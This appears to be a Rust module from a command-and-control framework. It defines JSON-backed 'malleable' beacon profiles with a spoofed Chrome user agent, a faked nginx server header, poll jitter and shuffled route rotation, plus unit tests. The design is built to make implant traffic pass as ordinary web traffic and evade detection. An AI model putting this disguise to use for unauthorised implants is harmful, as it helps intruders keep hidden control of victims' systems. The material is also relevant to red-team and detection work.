use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::Path;

/// Malleable C2 profile for the HTTP(S) beacon transport.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Profile {
    pub name: String,
    pub user_agent: String,
    pub enroll_uri: String,
    pub poll_uri: String,
    #[serde(default)]
    pub request_headers: BTreeMap<String, String>,
    #[serde(default)]
    pub response_headers: BTreeMap<String, String>,
    #[serde(default = "default_poll_interval")]
    pub poll_interval_secs: u64,
    #[serde(default = "default_jitter")]
    pub jitter_secs: u64,
}

fn default_poll_interval() -> u64 {
    5
}

fn default_jitter() -> u64 {
    3
}

impl Default for C2Profile {
    fn default() -> Self {
        let mut response_headers = BTreeMap::new();
        response_headers.insert("Server".into(), "nginx".into());
        response_headers.insert("Cache-Control".into(), "no-store".into());

        Self {
            name: "default".into(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
                         (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
                .into(),
            enroll_uri: "/api/v1/enroll".into(),
            poll_uri: "/api/v1/poll".into(),
            request_headers: BTreeMap::new(),
            response_headers,
            poll_interval_secs: default_poll_interval(),
            jitter_secs: default_jitter(),
        }
    }
}

impl C2Profile {
    /// Loads `profile.json` from the state directory, falling back to defaults.
    pub fn load_or_default(state_dir: &Path) -> anyhow::Result<Self> {
        let path = state_dir.join("profile.json");
        if !path.exists() {
            return Ok(Self::default());
        }
        let raw = std::fs::read_to_string(&path)?;
        Ok(serde_json::from_str(&raw)?)
    }

    /// Writes the default profile to the state directory if absent.
    pub fn write_default_if_missing(state_dir: &Path) -> anyhow::Result<()> {
        let path = state_dir.join("profile.json");
        if !path.exists() {
            let profile = Self::default();
            std::fs::write(&path, serde_json::to_string_pretty(&profile)?)?;
        }
        Ok(())
    }
}

/// An ordered collection of profiles used for rotation.
///
/// The server registers every distinct enroll/poll route so any profile can be
/// reached; beacons cycle through the set one full permutation at a time so
/// every profile is exercised without a fixed order.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProfileSet {
    pub profiles: Vec<C2Profile>,
}

impl Default for ProfileSet {
    fn default() -> Self {
        Self {
            profiles: vec![C2Profile::default()],
        }
    }
}

impl ProfileSet {
    /// Wraps a single profile.
    pub fn single(profile: C2Profile) -> Self {
        Self {
            profiles: vec![profile],
        }
    }

    /// Loads `profiles.json` if present, then `profile.json`, then defaults.
    pub fn load_or_default(state_dir: &Path) -> anyhow::Result<Self> {
        let set_path = state_dir.join("profiles.json");
        if set_path.exists() {
            let raw = std::fs::read_to_string(&set_path)?;
            let set: Self = serde_json::from_str(&raw)?;
            if !set.profiles.is_empty() {
                return Ok(set);
            }
        }
        let single_path = state_dir.join("profile.json");
        if single_path.exists() {
            let raw = std::fs::read_to_string(&single_path)?;
            let profile: C2Profile = serde_json::from_str(&raw)?;
            return Ok(Self::single(profile));
        }
        Ok(Self::default())
    }

    /// Writes `profiles.json` with the default set if neither file exists.
    pub fn write_default_if_missing(state_dir: &Path) -> anyhow::Result<()> {
        let set_path = state_dir.join("profiles.json");
        let single_path = state_dir.join("profile.json");
        if set_path.exists() || single_path.exists() {
            return Ok(());
        }
        let set = Self::default();
        std::fs::write(&set_path, serde_json::to_string_pretty(&set)?)?;
        Ok(())
    }

    pub fn len(&self) -> usize {
        self.profiles.len()
    }

    pub fn is_empty(&self) -> bool {
        self.profiles.is_empty()
    }

    pub fn iter(&self) -> impl Iterator<Item = &C2Profile> {
        self.profiles.iter()
    }

    /// Distinct enroll URIs across all profiles.
    pub fn enroll_uris(&self) -> std::collections::BTreeSet<String> {
        self.profiles
            .iter()
            .map(|profile| profile.enroll_uri.clone())
            .collect()
    }

    /// Distinct poll URIs across all profiles.
    pub fn poll_uris(&self) -> std::collections::BTreeSet<String> {
        self.profiles
            .iter()
            .map(|profile| profile.poll_uri.clone())
            .collect()
    }

    /// One full permutation of profile indexes, shuffled.
    pub fn shuffled_cycle(&self) -> Vec<usize> {
        use rand::seq::SliceRandom;
        let mut cycle: Vec<usize> = (0..self.profiles.len()).collect();
        cycle.shuffle(&mut rand::thread_rng());
        cycle
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_profile_roundtrips() {
        let profile = C2Profile::default();
        let json = serde_json::to_string(&profile).expect("serialize");
        let parsed: C2Profile = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.enroll_uri, "/api/v1/enroll");
        assert_eq!(parsed.poll_uri, "/api/v1/poll");
        assert_eq!(parsed.poll_interval_secs, 5);
        assert_eq!(parsed.jitter_secs, 3);
    }

    #[test]
    fn partial_json_uses_defaults() {
        let parsed: C2Profile = serde_json::from_str(
            r#"{"name":"custom","user_agent":"ua","enroll_uri":"/e","poll_uri":"/p"}"#,
        )
        .expect("deserialize");
        assert_eq!(parsed.poll_interval_secs, 5);
        assert_eq!(parsed.jitter_secs, 3);
    }

    #[test]
    fn profile_set_collects_distinct_uris() {
        let a = C2Profile {
            name: "a".into(),
            enroll_uri: "/a/enroll".into(),
            poll_uri: "/a/poll".into(),
            ..Default::default()
        };
        let b = C2Profile {
            name: "b".into(),
            enroll_uri: "/b/enroll".into(),
            poll_uri: "/b/poll".into(),
            ..Default::default()
        };
        let set = ProfileSet {
            profiles: vec![a, b],
        };
        assert_eq!(
            set.enroll_uris().into_iter().collect::<Vec<_>>(),
            vec!["/a/enroll".to_string(), "/b/enroll".to_string()]
        );
        assert_eq!(
            set.poll_uris().into_iter().collect::<Vec<_>>(),
            vec!["/a/poll".to_string(), "/b/poll".to_string()]
        );
    }

    #[test]
    fn shuffled_cycle_is_a_permutation() {
        let set = ProfileSet {
            profiles: vec![
                C2Profile {
                    name: "a".into(),
                    ..Default::default()
                },
                C2Profile {
                    name: "b".into(),
                    ..Default::default()
                },
                C2Profile {
                    name: "c".into(),
                    ..Default::default()
                },
            ],
        };
        for _ in 0..16 {
            let mut cycle = set.shuffled_cycle();
            cycle.sort_unstable();
            assert_eq!(cycle, vec![0, 1, 2]);
        }
    }

    #[test]
    fn profile_set_roundtrips_json() {
        let set = ProfileSet::default();
        let json = serde_json::to_string(&set).expect("serialize");
        let parsed: ProfileSet = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.len(), 1);
    }
}
